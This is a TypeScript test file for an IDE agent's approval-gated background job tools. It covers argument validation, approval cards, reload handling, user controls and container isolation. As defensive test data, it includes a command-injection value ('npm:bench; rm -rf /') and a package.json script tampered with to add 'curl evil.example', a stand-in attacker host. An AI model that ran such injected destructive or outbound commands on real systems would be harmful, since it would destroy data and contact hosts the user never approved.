/**
 * P2b of the long-Mission plan: the Agent's long-job tools. Off by default,
 * never in a Mission run, every job approved on a card that shows the
 * script, the time limit and where it runs (Workspace full included), the
 * job that runs is the one the card showed, a reload attaches instead of
 * restarting, and the user's controls (the "Long Jobs" command) work.
 * SIMULATED model replies; the jobs run for real.
 */

import assert from 'node:assert/strict';
import { rmSync } from 'node:fs';
import test from 'node:test';

import { isAutoAllowed } from '../src/agentProfiles.js';
import { validateToolArgs } from '../src/agentTools.js';
import { noticeUncertainJobs, runJobsMenu, suggestedContainerSettings, type JobsUi } from '../src/jobCommands.js';
import type { JobRecord } from '../src/jobRecord.js';
import { jobToolDefinitions } from '../src/jobTools.js';
import { assistantText, HostHarness, toolCallReply } from './helpers/hostHarness.js';

type Request = { tools?: Array<{ function: { name: string } }>; messages?: Array<{ content: string | null; tool_call_id?: string }> };
const call = (id: string, name: string, args: Record<string, unknown>) => ({ kind: 'json' as const, body: toolCallReply([{ id, name, args }]) });
const say = (text: string) => ({ kind: 'json' as const, body: assistantText(text) });
const result = (h: HostHarness, id: string) => String((h.model.requests as Request[]).flatMap((r) => r.messages ?? []).find((m) => m.tool_call_id === id)?.content ?? '');
const offered = (h: HostHarness, index = 0) => ((h.model.requests[index] as Request).tools ?? []).map((t) => t.function.name);

const PACKAGE = JSON.stringify({ name: 'jobs', private: true, scripts: { test: 'node t.js', bench: 'node bench.js', deploy: 'node deploy.js' } });
const BENCH = "require('node:fs').appendFileSync('starts.txt', 'start\\n'); let i = 0; const t = setInterval(() => { console.log(`bench ${++i}`); if (i >= Number(process.env.TICKS || 3)) { clearInterval(t); console.log('p95_ms 12'); } }, 100);\n";

async function withHost(settings: Record<string, unknown>, body: (h: HostHarness) => Promise<void>): Promise<void> {
  const h = new HostHarness();
  await h.start({ agentProfile: 'safe-auto', ...settings });
  const dirs: string[] = [];
  try {
    await h.writeFile('package.json', PACKAGE);
    await h.writeFile('bench.js', BENCH);
    await h.writeFile('t.js', 'process.exit(0);\n');
    await body(h);
  } finally {
    for (const job of h.provider.jobs.list()) {
      if (job.status === 'running' || job.status === 'starting') {
        await h.provider.jobs.cancel(job.id);
        await h.provider.jobs.waitFor(job.id, { pollMs: 100 });
      }
      dirs.push(job.dir);
    }
    h.provider.cancelRequest();
    await h.dispose();
    for (const dir of dirs) {
      rmSync(dir, { recursive: true, force: true });
    }
  }
}

/** Run one Agent request; approve (or reject) every card; `beforeApproval` runs while a card waits. */
async function run(h: HostHarness, text: string, options: { approve?: boolean; beforeApproval?: () => Promise<void> } = {}): Promise<string[]> {
  const cards: string[] = [];
  let done = false;
  const sent = h.provider.sendMessage(text, 'agent', 'local').then(() => (done = true));
  let seen = '';
  const deadline = Date.now() + 30000;
  while (!done && Date.now() < deadline) {
    const pending = h.last()?.agentPending as { actionId: string; digest: string; tool: string; targets: string[] } | null | undefined;
    if (pending && pending.actionId !== seen) {
      seen = pending.actionId;
      cards.push(`${pending.tool} | ${pending.targets.join(' | ')}`);
      await options.beforeApproval?.();
      if (options.approve === false) {
        await h.provider.rejectAgentAction(pending.actionId, pending.digest);
      } else {
        await h.provider.approveAgentAction(pending.actionId, pending.digest);
      }
    }
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  await sent;
  return cards;
}

const ON = { jobs: { enabled: true, container: null } };

test('start_job and job_status arguments are exact and bounded', () => {
  assert.deepEqual(validateToolArgs('start_job', { commandId: 'npm:bench' }), { commandId: 'npm:bench' });
  assert.deepEqual(validateToolArgs('start_job', { commandId: 'npm:bench', timeoutSec: 600 }), { commandId: 'npm:bench', timeoutSec: 600 });
  for (const bad of [{}, { commandId: 'bench' }, { commandId: 'npm:bench; rm -rf /' }, { commandId: 'npm:bench', timeoutSec: 0 }, { commandId: 'npm:bench', timeoutSec: 21601 }, { commandId: 'npm:bench', cwd: '/' }]) {
    assert.throws(() => validateToolArgs('start_job', bad), /Invalid start_job arguments/, JSON.stringify(bad));
  }
  assert.deepEqual(validateToolArgs('job_status', {}), {});
  assert.deepEqual(validateToolArgs('job_status', { jobId: '0b0c5a1e-1111-4222-8333-944445555666', waitSec: 30 }), { jobId: '0b0c5a1e-1111-4222-8333-944445555666', waitSec: 30 });
  for (const bad of [{ jobId: '../x' }, { waitSec: 121 }, { jobId: 'abcdefgh', extra: 1 }]) {
    assert.throws(() => validateToolArgs('job_status', bad), /Invalid job_status arguments/, JSON.stringify(bad));
  }
});

test('no profile starts a job without the user; reading a job\'s status is a read', () => {
  for (const profile of ['ask', 'safe-auto', 'workspace-full'] as const) {
    assert.equal(isAutoAllowed(profile, 'start_job'), false, profile);
  }
  assert.equal(isAutoAllowed('ask', 'job_status'), false);
  assert.equal(isAutoAllowed('safe-auto', 'job_status'), true);
  assert.equal(isAutoAllowed('workspace-full', 'job_status'), true);
});

test('off by default: not offered, and a call anyway gets no card and starts nothing', async () => {
  await withHost({}, async (h) => {
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Okay.'));
    const cards = await run(h, 'Run the benchmark.');
    assert.equal(offered(h).includes('start_job'), false);
    assert.deepEqual(cards, []);
    assert.match(result(h, 'j'), /^Not proposed: long jobs are off for this run/);
    assert.deepEqual(h.provider.jobs.list(), []);
  });
});

test('on: never offered in a Mission run', async () => {
  await withHost(ON, async (h) => {
    assert.deepEqual(jobToolDefinitions(h.provider).map((tool) => tool.function.name), ['start_job', 'job_status']);
    h.provider.missionAuto = { missionId: 'mis_000000000000000000000000', stop: null, holdAutonomy: false };
    assert.deepEqual(jobToolDefinitions(h.provider), []);
    h.provider.missionAuto = null;
    h.provider.activeMission = { id: 'mis_000000000000000000000000', revision: 1 };
    assert.deepEqual(jobToolDefinitions(h.provider), []);
    h.provider.activeMission = null;
  });
});

test('on: the card shows the script, the time limit and where it runs; the job runs once in the background and job_status follows it', async () => {
  await withHost({ ...ON, agentProfile: 'workspace-full' }, async (h) => {
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench', timeoutSec: 600 }), say('Started.'));
    const cards = await run(h, 'Run the benchmark in the background.');
    assert.equal(offered(h).includes('start_job'), true);
    assert.deepEqual(cards, [
      'start_job | long job npm:bench: npm run bench → node bench.js | in the background for up to 10 min; it keeps running if the window reloads, and RAME Code never starts it again on its own | isolation: isolated: writes only in the project, temporary and package-cache folders; network allowed',
    ], 'Workspace full still asks for every job');
    const started = result(h, 'j');
    const id = /^Started job ([0-9a-f-]{36}) \(npm:bench\) in the background\. It keeps running if the window reloads\./.exec(started)?.[1];
    assert.ok(id, started);
    const [job] = h.provider.jobs.list();
    assert.equal(job?.id, id);
    assert.deepEqual(job?.spec.argv.slice(-3), ['run', '--ignore-scripts', 'bench'], 'npm lifecycle scripts never run');
    assert.match(job?.spec.executable ?? '', /python3$/, 'the persisted spec launches the isolated child, not an unprotected npm process');
    assert.ok(job?.spec.argv.some((part) => /rame-isolate\.py$/.test(part)), 'the isolation survives a window reload because it is part of the approved spec');
    assert.equal(job?.spec.timeoutMs, 600_000);
    // job_status is a read: no card in safe-auto or workspace-full.
    h.model.enqueue(call('s', 'job_status', { jobId: id, waitSec: 20 }), say('Finished: p95 12 ms.'));
    assert.deepEqual(await run(h, 'How did the benchmark go?'), []);
    assert.match(result(h, 's'), /^job npm:bench \([0-9a-f-]+\): finished\. The job npm:bench finished \(exit 0\)/);
    assert.match(result(h, 's'), /Last output:\n[\s\S]*bench 3\np95_ms 12\n$/);
    assert.equal(await h.readFile('starts.txt'), 'start\n');
    h.model.enqueue(call('l', 'job_status', {}), say('One job.'));
    await run(h, 'List the jobs.');
    assert.match(result(h, 'l'), /^job npm:bench \([0-9a-f-]+\): finished\./);
  });
});

test('a rejected card starts nothing; an unknown or unlisted script is not proposed', async () => {
  await withHost(ON, async (h) => {
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Okay.'));
    const cards = await run(h, 'Run the benchmark.', { approve: false });
    assert.equal(cards.length, 1);
    assert.deepEqual(h.provider.jobs.list(), []);
  });
  await withHost(ON, async (h) => {
    h.model.enqueue(call('a', 'start_job', { commandId: 'npm:deploy' }), call('b', 'start_job', { commandId: 'npm:build' }), say('Okay.'));
    const cards = await run(h, 'Deploy, then build.');
    assert.deepEqual(cards, []);
    assert.match(result(h, 'a'), /^Not proposed: npm:deploy is not a job command; use npm:<script> for one of the package scripts test, check, compile, lint, typecheck, bench, benchmark, build, e2e, perf\. No job started\./);
    assert.match(result(h, 'b'), /^Not proposed: package\.json has no script "build"/);
    assert.deepEqual(h.provider.jobs.list(), []);
  });
});

test('the script changed while the card waited: nothing starts', async () => {
  await withHost(ON, async (h) => {
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Okay.'));
    await run(h, 'Run the benchmark.', {
      beforeApproval: () => h.writeFile('package.json', JSON.stringify({ name: 'jobs', private: true, scripts: { bench: 'node bench.js && curl evil.example' } })),
    });
    assert.deepEqual(h.provider.jobs.list(), []);
    assert.match(h.last()?.status ?? '', /The job changed after it was approved .* Nothing was started/);
  });
});

test('a reload while a job runs: the new window attaches to it and the model cannot start it twice', async () => {
  await withHost(ON, async (h) => {
    await h.writeFile('bench.js', BENCH.replace("Number(process.env.TICKS || 3)", '30'));
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Started.'));
    await run(h, 'Run the benchmark.');
    const [first] = h.provider.jobs.list();
    assert.ok(first);
    h.createProvider();
    const attached = await (async () => {
      for (let i = 0; i < 50; i++) {
        const fresh = await h.provider.jobs.refresh(first.id);
        const job = (fresh.ok ? fresh.value : h.provider.jobs.get(first.id)) as JobRecord;
        if (job.status === 'running') {
          return job;
        }
        await new Promise((resolve) => setTimeout(resolve, 100));
      }
      return h.provider.jobs.get(first.id) as JobRecord;
    })();
    assert.equal(attached.status, 'running', attached.note);
    h.model.enqueue(call('again', 'start_job', { commandId: 'npm:bench' }), say('It is already running.'));
    const cards = await run(h, 'Run the benchmark.');
    assert.equal(cards.length, 1, 'the user is asked, as always');
    assert.match(result(h, 'again'), /^Not started: The job npm:bench is already running \([0-9a-f-]+\)\. Nothing was started\./);
    const done = await h.provider.jobs.waitFor(first.id, { pollMs: 100 });
    assert.ok(done.ok && done.value.status === 'finished', done.ok ? done.value.note : done.error);
    assert.equal(await h.readFile('starts.txt'), 'start\n', 'it ran once');
  });
});

// ----- The user's controls: "RAME Code: Long Jobs" -----

function fakeUi(script: { picks: Array<(items: Array<{ label: string }>) => { label: string } | undefined>; inputs?: string[]; warnings?: Array<string | undefined> }): JobsUi & { seen: string[] } {
  const seen: string[] = [];
  return {
    seen,
    async showQuickPick(items) {
      seen.push(`pick: ${items.map((item) => item.label).join(' / ')}`);
      const next = script.picks.shift();
      return (next?.(items) ?? undefined) as never;
    },
    async showInputBox(options) {
      const value = script.inputs?.shift();
      seen.push(`input: ${value ?? '(cancel)'} -> ${value === undefined ? '' : options.validateInput?.(value) ?? 'valid'}`);
      return value;
    },
    async showWarningMessage(message, options) {
      seen.push(`warning: ${message} | ${options.detail ?? ''}`);
      return script.warnings?.shift();
    },
    async showInformationMessage(message) {
      seen.push(`info: ${message}`);
      return undefined;
    },
  };
}

const pick = (pattern: RegExp) => (items: Array<{ label: string }>) => items.find((item) => pattern.test(item.label));

test('Long Jobs command: turn on (after a warning), choose a container (validated), stop a running job', async () => {
  await withHost({}, async (h) => {
    const ui = fakeUi({ picks: [pick(/OFF — turn on/)], warnings: ['Turn on'] });
    await runJobsMenu(h.provider, ui);
    assert.match(ui.seen[1] ?? '', /^warning: Turn on long jobs for Agent\? \| .*no sandbox unless you choose a container/);
    assert.equal(h.provider.settings.jobs.enabled, true);
    const bad = JSON.stringify({ ...suggestedContainerSettings(), outputDir: '.git' });
    const good = JSON.stringify({ ...suggestedContainerSettings(), image: 'ubuntu:24.04', memoryMb: 1024 });
    const ui2 = fakeUi({ picks: [pick(/Where jobs run: this computer/), pick(/In a container/)], inputs: [bad] });
    await runJobsMenu(h.provider, ui2);
    assert.match(ui2.seen.join('\n'), /input: .* -> the output folder must be a plain folder inside the project/);
    const ui3 = fakeUi({ picks: [pick(/Where jobs run/), pick(/In a container/)], inputs: [good] });
    await runJobsMenu(h.provider, ui3);
    assert.equal(h.provider.settings.jobs.container?.memoryMb, 1024);
    const ui4 = fakeUi({ picks: [pick(/Where jobs run: container ubuntu:24\.04/), pick(/On this computer/)] });
    await runJobsMenu(h.provider, ui4);
    assert.equal(h.provider.settings.jobs.container, null);
    // A running job, stopped by the user from the menu.
    await h.writeFile('bench.js', BENCH.replace("Number(process.env.TICKS || 3)", '600'));
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Started.'));
    await run(h, 'Run the benchmark.');
    const [job] = h.provider.jobs.list();
    assert.ok(job);
    for (let i = 0; i < 50 && h.provider.jobs.get(job.id)?.status !== 'running'; i++) {
      await new Promise((resolve) => setTimeout(resolve, 100));
      await h.provider.jobs.refresh(job.id);
    }
    const ui5 = fakeUi({ picks: [pick(/npm:bench — (running|starting)/), pick(/^Stop it$/)], warnings: ['Stop'] });
    await runJobsMenu(h.provider, ui5);
    const stopped = await h.provider.jobs.waitFor(job.id, { pollMs: 100 });
    assert.ok(stopped.ok && stopped.value.status === 'cancelled', stopped.ok ? stopped.value.note : stopped.error);
    assert.match(ui5.seen.join('\n'), /warning: Stop the job npm:bench\?/);
  });
});

test('after a reload the user is told about an uncertain job and can abandon it; nothing restarts', async () => {
  await withHost(ON, async (h) => {
    await h.writeFile('bench.js', "require('node:fs').appendFileSync('starts.txt', 'start\\n'); setInterval(() => {}, 1000);\n");
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Started.'));
    await run(h, 'Run the benchmark.');
    const [job] = h.provider.jobs.list();
    assert.ok(job);
    let running = job;
    for (let i = 0; i < 50 && running.status !== 'running'; i++) {
      await new Promise((resolve) => setTimeout(resolve, 100));
      const r = await h.provider.jobs.refresh(job.id);
      running = r.ok ? r.value : running;
    }
    assert.equal(running.status, 'running');
    process.kill(running.supervisorPid as number, 'SIGKILL');
    await new Promise((resolve) => setTimeout(resolve, 8000));
    h.createProvider();
    let lost = h.provider.jobs.get(job.id) as JobRecord;
    for (let i = 0; i < 30 && lost.status !== 'uncertain'; i++) {
      await new Promise((resolve) => setTimeout(resolve, 100));
      lost = h.provider.jobs.get(job.id) as JobRecord;
    }
    assert.equal(lost.status, 'uncertain', lost.note);
    const ui = fakeUi({ picks: [pick(/npm:bench — uncertain/), pick(/^Abandon it/)], warnings: ['Abandon'] });
    (ui as unknown as { showInformationMessage: JobsUi['showInformationMessage'] }).showInformationMessage = async (message: string) => {
      ui.seen.push(`info: ${message}`);
      return /lost track/.test(message) ? 'Review' : undefined;
    };
    await noticeUncertainJobs(h.provider, ui);
    assert.match(ui.seen[0] ?? '', /^info: RAME Code lost track of the long job npm:bench; nothing was restarted\. Review it\?/);
    assert.equal(h.provider.jobs.get(job.id)?.status, 'abandoned');
    assert.equal(await h.readFile('starts.txt'), 'start\n');
    // The user ends the orphan (RAME does not).
    if (lost.childPid !== null) {
      try {
        process.kill(-lost.childPid, 'SIGKILL');
      } catch {
        try {
          process.kill(lost.childPid, 'SIGKILL');
        } catch {
          // gone
        }
      }
    }
  });
});

for (const runtime of ['podman', 'docker'] as const) {
test(`${runtime}: with a container configured, the card says so and the job runs inside it (project read-only, results in the output folder)`, { skip: (() => {
  try {
    return require('node:child_process').spawnSync(runtime, ['image', 'inspect', 'ubuntu:24.04'], { stdio: 'ignore', timeout: 20_000 }).status === 0 ? false : `${runtime} or its local image ubuntu:24.04 is not available here`;
  } catch {
    return `${runtime} is not available here`;
  }
})() }, async () => {
  const container = { ...suggestedContainerSettings(), runtime, image: 'ubuntu:24.04', memoryMb: 1024, cpus: 1, outputDir: 'job-output' };
  await withHost({ jobs: { enabled: true, container } }, async (h) => {
    await h.writeFile('bench.js', "const fs = require('node:fs'); let wrote; try { fs.writeFileSync('hack.txt', 'x'); wrote = 'yes'; } catch (e) { wrote = e.code; } fs.writeFileSync('job-output/result.txt', `project write: ${wrote}`); console.log('done in container');\n");
    h.model.enqueue(call('j', 'start_job', { commandId: 'npm:bench' }), say('Started.'));
    const cards = await run(h, 'Run the benchmark.');
    assert.equal(cards.length, 1);
    assert.match(cards[0] ?? '', /\| isolation: (?:rootless podman )?container ubuntu:24\.04 \(local image only, never pulled\): no network, 1024 MB of memory, 1 CPU\(s\), the project read-only except job-output\//);
    assert.match(result(h, 'j'), /^Started job [0-9a-f-]+ \(npm:bench\) in the background, in its container\./);
    const [job] = h.provider.jobs.list();
    assert.ok(job);
    assert.equal(job.spec.executable, runtime);
    const done = await h.provider.jobs.waitFor(job.id, { pollMs: 100 });
    assert.ok(done.ok && done.value.status === 'finished' && done.value.exit?.exitCode === 0, done.ok ? `${done.value.note}\n${await h.provider.jobs.tail(job.id)}` : done.error);
    assert.equal(await h.readFile('job-output/result.txt'), 'project write: EROFS');
    await assert.rejects(h.readFile('hack.txt'));
    assert.match(await h.provider.jobs.tail(job.id), /done in container/);
  });
});
}
